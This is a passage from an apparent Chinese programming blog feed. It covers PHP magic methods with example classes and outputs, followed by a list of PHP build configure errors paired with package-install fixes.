初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> serialize($person);<span class="comment">// 当在类外部使用serialize()时会调用这里的__sleep()方法O:6:"Person":2:&#123;s:4:"name";s:8:"5bCP5piO";s:3:"age";i:25;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>执行unserialize()时，先会调用这个函数。如果说 __sleep() 是白的，那么 __wakeup() 就是黑的了。 那么为什么呢？</p>
<p>因为与之相反，<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
<p>作用：</p>
<p>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
<p>还是看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * <span class="doctag">@return</span> array     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = base64_encode(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'name'</span>,</span><br><span class="line">            <span class="string">'age'</span></span><br><span class="line">        ); <span class="comment">// 这里必须返回一个数值，里边的元素表示返回的属性名称    </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * __wakeup     */</span>    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;"</span>;  <span class="keyword">$this</span>-&gt;name = <span class="number">2</span>;        </span><br><span class="line">             <span class="keyword">$this</span>-&gt;sex = <span class="string">'男'</span>;        <span class="comment">// 这里不需要返回数组</span></span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_dump(serialize($person));<span class="comment">// 当在类外部使用serialize()时会调用这里的__sleep()方法string(58) "O:6:"Person":2:&#123;s:4:"name";s:8:"5bCP5piO";s:3:"age";i:25;&#125;" </span></span><br><span class="line">var_dump(unserialize(serialize($person)));<span class="comment">// 当在类外部使用serialize()时会调用这里的__sleep()方法当在类外部使用unserialize()时会调用这里的__wakeup()方法object(Person)#2 (3) &#123; ["sex"]=&gt; string(3) "男" ["name"]=&gt; int(2) ["age"]=&gt; int(25) &#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>类被当成字符串时的回应方法</p>
<p>作用：</p>
<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p>
<p>注意：</p>
<p>此方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p>
<p>警告：</p>
<p>不能在 __toString() 方法中抛出异常。这么做会导致致命错误。</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'go go go'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;<span class="comment">// go go go</span></span><br></pre></td></tr></table></figure>

<p>那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下：</p>
<p>代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line"><span class="keyword">echo</span> $person;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line">Catchable fatal error: Object of class Person could not be converted to string in D:\www\test.php on line 12</span><br></pre></td></tr></table></figure>

<p>很明显，页面报了一个致命错误，这是语法所不允许的。</p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>作用：</p>
<p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p>
<p>注意：</p>
<p>本特性只在 PHP 5.3.0 及以上版本有效。</p>
<p>直接上代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这可是一个对象哦'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person(); <span class="comment">// 这可是一个对象哦</span></span><br></pre></td></tr></table></figure>

<p>当然，如果你执意要将对象当函数方法使用，那么会得到下面结果：</p>
<p>Fatal error: Function name must be a string in D:\www\test.php on line 12</p>
<h4 id="set-state"><a href="#set-state" class="headerlink" title="__set_state()"></a>__set_state()</h4><p>作用：</p>
<p>自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。</p>
<p>参数：</p>
<p>本方法的唯一参数是一个数组，其中包含按 array(‘property’ =&gt; value, …) 格式排列的类属性。</p>
<p>下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何：</p>
<p>上代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">var_export($person);</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">Person::__set_state(<span class="keyword">array</span>( <span class="string">'sex'</span> =&gt; <span class="string">'男'</span>, <span class="string">'name'</span> =&gt; <span class="string">'小明'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>, ))</span><br></pre></td></tr></table></figure>

<p>很明显，将对象中的属性都打印出来了</p>
<p>加了 __set_state() 之后：</p>
<p>继续上代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span><span class="params">($an_array)</span> </span>&#123;</span><br><span class="line">        $a = <span class="keyword">new</span> Person();</span><br><span class="line">        $a-&gt;name = $an_array[<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">return</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person-&gt;name = <span class="string">'小红'</span>;</span><br><span class="line">var_export($person);</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">Person::__set_state(<span class="keyword">array</span>( <span class="string">'sex'</span> =&gt; <span class="string">'男'</span>, <span class="string">'name'</span> =&gt; <span class="string">'小红'</span>, <span class="string">'age'</span> =&gt; <span class="number">25</span>, ))</span><br></pre></td></tr></table></figure>

<h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4><p>在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。</p>
<p>作用：</p>
<p>对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。</p>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$copy_of_object = <span class="keyword">clone</span> $object;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。</p>
<p>当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。</p>
<p>看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>, $age = <span class="number">25</span>, $sex = <span class="string">'男'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"你正在克隆对象&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person2 = <span class="keyword">clone</span> $person;</span><br><span class="line">var_dump(<span class="string">'persion1:'</span>);</span><br><span class="line">var_dump($person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(<span class="string">'persion2:'</span>);</span><br><span class="line">var_dump($person2);</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">Person::__clone你正在克隆对象string(<span class="number">9</span>) <span class="string">"persion1:"</span> object(Person)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">     [<span class="string">"sex"</span>]=&gt; string(<span class="number">3</span>) <span class="string">"男"</span> </span><br><span class="line">     [<span class="string">"name"</span>]=&gt; string(<span class="number">6</span>) <span class="string">"小明"</span></span><br><span class="line">     [<span class="string">"age"</span>]=&gt; int(<span class="number">25</span>) &#125; </span><br><span class="line">     string(<span class="number">9</span>) <span class="string">"persion2:"</span> </span><br><span class="line">     object(Person)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">          [<span class="string">"sex"</span>]=&gt; string(<span class="number">3</span>) <span class="string">"男"</span> </span><br><span class="line">          [<span class="string">"name"</span>]=&gt; string(<span class="number">6</span>) <span class="string">"小明"</span></span><br><span class="line">          [<span class="string">"age"</span>]=&gt; int(<span class="number">25</span>)</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>克隆成功。</p>
<h4 id="autoload"><a href="#autoload" class="headerlink" title="__autoload()"></a>__autoload()</h4><p>作用：</p>
<p>你可以通过定义这个函数来启用类的自动加载。</p>
<p>在魔术函数 __autoload() 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。</p>
<p>但是有了 __autoload() 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。</p>
<p>还是通过例子来看看吧：</p>
<p>先看看以往的方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**  * 文件non_autoload.php  */</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/A.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/B.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/C.php'</span>);  </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;    </span><br><span class="line">      $a = <span class="keyword">new</span> A();</span><br><span class="line">      $b = <span class="keyword">new</span> B();</span><br><span class="line">      $c = <span class="keyword">new</span> C();</span><br><span class="line">      <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;</span><br><span class="line">      $a = newA();</span><br><span class="line">      $b = <span class="keyword">new</span> B();</span><br><span class="line">      <span class="comment">// … 业务逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。</p>
<p>那么如果使用 __autoload() 方式呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**  * 文件autoload_demo.php  */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    $filePath = <span class="string">"project/class/&#123;$className&#125;.php"</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_readable($filePath)) &#123;</span><br><span class="line">        <span class="keyword">require</span> ($filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;</span><br><span class="line">    $a = <span class="keyword">new</span> A();</span><br><span class="line">    $b = <span class="keyword">new</span> B();</span><br><span class="line">    $c = <span class="keyword">new</span> C();</span><br><span class="line">    <span class="comment">// … 业务逻辑</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;</span><br><span class="line">    $a = newA();</span><br><span class="line">    $b = <span class="keyword">new</span> B();</span><br><span class="line">    <span class="comment">// … 业务逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。</p>
<p>再来看看这里的效率如何，我们分析下：</p>
<p>当php引擎第一次使用类A，但是找不到时，会自动调用 __autoload 方法，并将类名“A”作为参数传入。所以，我们在 __autoload() 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。</p>
<p>注意：</p>
<p>这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。</p>
<p>扩展：</p>
<p>其实php发展到今天，已经有将 <code>spl_autoload_register</code> — 注册给定的函数作为 __autoload 的实现了，但是这个不在本文讲解之内，有兴趣可以自行看手册。</p>
<h4 id="debugInfo"><a href="#debugInfo" class="headerlink" title="__debugInfo()"></a>__debugInfo()</h4><p>注意：</p>
<p>该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。</p>
<p>看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $prop;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prop = $val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**     * <span class="doctag">@return</span> array     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'propSquared'</span> =&gt; <span class="keyword">$this</span>-&gt;prop**<span class="number">2</span>, ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="keyword">new</span> C(<span class="number">42</span>));</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">object(C)<span class="comment">#1 (1) &#123; ["propSquared"]=&gt; int(1764) &#125;</span></span><br></pre></td></tr></table></figure>

<p>再次注意：</p>
<p>这里的 <code>**</code> 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看<a href="https://www.php.net/" target="_blank" rel="noopener">PHP手册</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>PHP编译安装时常见错误解决办法</title>
    <url>/articles/PHP%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%97%B6%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<h4 id="configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution"><a href="#configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution" class="headerlink" title="configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution"></a>configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution</h4><p>Fix: <code>yum -y install libxslt-devel</code></p>
<h4 id="configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation"><a href="#configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation" class="headerlink" title="configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation"></a>configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation</h4><p>Fix: <code>yum -y install net-snmp-devel</code></p>
<h4 id="configure-error-Please-reinstall-readline-I-cannot-find-readline-h"><a href="#configure-error-Please-reinstall-readline-I-cannot-find-readline-h" class="headerlink" title="configure: error: Please reinstall readline - I cannot find readline.h"></a>configure: error: Please reinstall readline - I cannot find readline.h</h4><p>Fix: <code>yum -y install readline-devel</code></p>
<h4 id="configure-error-Cannot-find-pspell"><a href="#configure-error-Cannot-find-pspell" class="headerlink" title="configure: error: Cannot find pspell"></a>configure: error: Cannot find pspell</h4><p>Fix: <code>yum -y install aspell-devel</code></p>
<h4 id="configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found"><a href="#configure-error-ODBC-header-file-‘-usr-include-sqlext-h’-not-found" class="headerlink" title="configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found"></a>configure: error: ODBC header file ‘/usr/include/sqlext.h’ not found</h4><p>Fix: <code>yum -y install unixODBC-devel</code></p>
<h4 id="configure-error-Unable-to-detect-ICU-prefix-or-usr-bin-icu-config-failed-Please-verify-ICU-install-prefix-and-make-sure-icu-config-works"><a href="#configure-error-Unable-to-detect-ICU-prefix-or-usr-bin-icu-config-failed-Please-verify-ICU-install-prefix-and-make-sure-icu-config-works" class="headerlink" title="configure: error: Unable to detect ICU prefix or /usr/bin/icu-config failed. Please verify ICU install prefix and make sure icu-config works."></a>configure: error: Unable to detect ICU prefix or /usr/bin/icu-config failed. Please verify ICU install prefix and make sure icu-config works.</h4><p>Fix: <code>yum -y install libicu-devel</code></p>
<h4 id="configure-error-utf8mime2text-has-new-signature-but-U8TCANONICAL-is-missing-This-should-not-happen-Check-config-log-for-additional-information"><a href="#configure-error-utf8mime2text-has-new-signature-but-U8TCANONICAL-is-missing-This-should-not-happen-Check-config-log-for-additional-information" class="headerlink" title="configure: error: utf8mime2text() has new signature, but U8TCANONICAL is missing. This should not happen. Check config.log for additional information"></a>configure: error: utf8mime2text() has new signature, but U8TCANONICAL is missing. This should not happen. Check config.log for additional information</h4><p>Fix: <code>yum -y install libc-client-devel</code></p>
<h4 id="configure-error-freetype-h-not-found"><a href="#configure-error-freetype-h-not-found" class="headerlink" title="configure: error: freetype.h not found"></a>configure: error: freetype.h not found</h4><p>Fix: <code>yum -y install freetype-devel</code></p>
<h4 id="configure-error-xpm-h-not-found"><a href="#configure-error-xpm-h-not-found" class="headerlink" title="configure: error: xpm.h not found"></a>configure: error: xpm.h not found</h4><p>Fix: <code>yum -y install libXpm-devel</code></p>
<h4 id="configure-error-png-h-not-found"><a href="#configure-error-png-h-not-found" class="headerlink" title="configure: error: png.h not found"></a>configure: error: png.h not found</h4><p>Fix: <code>yum -y install libpng-devel</code></p>
<h4 id="configure-error-vpx-codec-h-not-found"><a href="#configure-error-vpx-codec-h-not-found" class="headerlink" title="configure: error: vpx_codec.h not found"></a>configure: error: vpx_codec.h not found</h4><p>Fix: <code>yum -y install libvpx-devel</code></p>
<h4 id="configure-error-Cannot-find-enchant"><a href="#configure-error-Cannot-find-enchant" class="headerlink" title="configure: error: Cannot find enchant"></a>configure: error: Cannot find enchant</h4><p>Fix: <code>yum -y install enchant-devel</code></p>
<h4 id="configure-error-Please-reinstall-the-libcurl-distribution-easy-h-should-be-in-include-curl"><a href="#configure-error-Please-reinstall-the-libcurl-distribution-easy-h-should-be-in-include-curl" class="headerlink" title="configure: error: Please reinstall the libcurl distribution - easy.h should be in /include/curl/"></a>configure: error: Please reinstall the libcurl distribution - easy.h should be in /include/curl/</h4><p>Fix: <code>yum -y install libcurl-devel</code></p>
<h4 id="configure-error-mcrypt-h-not-found-Please-reinstall-libmcrypt"><a href="#configure-error-mcrypt-h-not-found-Please-reinstall-libmcrypt" class="headerlink" title="configure: error: mcrypt.h not found. Please reinstall libmcrypt"></a>configure: error: mcrypt.h not found. Please reinstall libmcrypt</h4><p>Fix:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://sourceforge.mirrorservice.org/m/mc/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz</span><br><span class="line"></span><br><span class="line">tar zxf libmcrypt-2.5.7.tar.gz</span><br><span class="line"></span><br><span class="line">cd libmcrypt-2.5.7</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h4 id="Cannot-find-imap"><a href="#Cannot-find-imap" class="headerlink" title="Cannot find imap"></a>Cannot find imap</h4><p>Fix: <code>ln -s /usr/lib64/libc-client.so /usr/lib/libc-client.so</code></p>
<h4 id="configure-error-utf8-mime2text-has-new-signature-but-U8T-CANONICAL-is-missing"><a href="#configure-error-utf8-mime2text-has-new-signature-but-U8T-CANONICAL-is-missing" class="headerlink" title="configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missing"></a>configure: error: utf8_mime2text() has new signature, but U8T_CANONICAL is missing</h4><p>Fix: <code>yum -y install libc-client-devel</code></p>
<h4 id="Cannot-find-ldap-h-yum-y-install-openldap"><a href="#Cannot-find-ldap-h-yum-y-install-openldap" class="headerlink" title="Cannot find ldap.h yum -y install openldap"></a>Cannot find ldap.h yum -y install openldap</h4><p>Fix: <code>yum -y install openldap-devel</code></p>
<h4 id="configure-error-Cannot-find-ldap-libraries-in-usr-lib"><a href="#configure-error-Cannot-find-ldap-libraries-in-usr-lib" class="headerlink" title="configure: error: Cannot find ldap libraries in /usr/lib"></a>configure: error: Cannot find ldap libraries in /usr/lib</h4><p>Fix: <code>cp -frp /usr/lib64/libldap* /usr/lib/</code></p>
<h4 id="configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path"><a href="#configure-error-Cannot-find-libpq-fe-h-Please-specify-correct-PostgreSQL-installation-path" class="headerlink" title="configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path"></a>configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path</h4><p>Fix: <code>yum -y install postgresql-devel</code></p>
<h4 id="configure-error-Please-reinstall-the-lib-curl-distribution"><a href="#configure-error-Please-reinstall-the-lib-curl-distribution" class="headerlink" title="configure: error: Please reinstall the lib curl distribution"></a>configure: error: Please reinstall the lib curl distribution</h4><p>Fix: <code>yum -y install curl-devel</code></p>
<h4 id="configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation-1"><a href="#configure-error-Could-not-find-net-snmp-config-binary-Please-check-your-net-snmp-installation-1" class="headerlink" title="configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation"></a>configure: error: Could not find net-snmp-config binary. Please check your net-snmp installation</h4><p>Fix: <code>yum -y install net-snmp-devel</code></p>
<h4 id="configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-1"><a href="#configure-error-xslt-config-not-found-Please-reinstall-the-libxslt-gt-1-1-0-distribution-1" class="headerlink" title="configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution"></a>configure: error: xslt-config not found. Please reinstall the libxslt &gt;= 1.1.0 distribution</h4><p>Fix: <code>yum -y install libxslt-devel</code></p>
